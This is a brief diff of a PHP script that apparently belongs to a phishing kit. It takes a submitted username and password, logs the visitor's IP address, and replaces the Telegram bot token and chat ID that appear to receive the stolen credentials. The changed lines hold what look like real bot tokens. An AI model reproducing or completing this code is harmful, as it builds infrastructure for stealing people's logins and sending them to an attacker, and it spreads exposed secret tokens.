@@ -27,8 +27,8 @@ if($usuario && $clave){
 
     file_put_contents($file, "WAIT", LOCK_EX);
 
-        $token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
-        $chat_id = "8448767308";
+        $token = "8841860301:AAHhQSV7_J9op9KFyDZWG_g6D7xz_nGniew";
+        $chat_id = "8841860301";
 
         // 🌐 IP REAL
         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
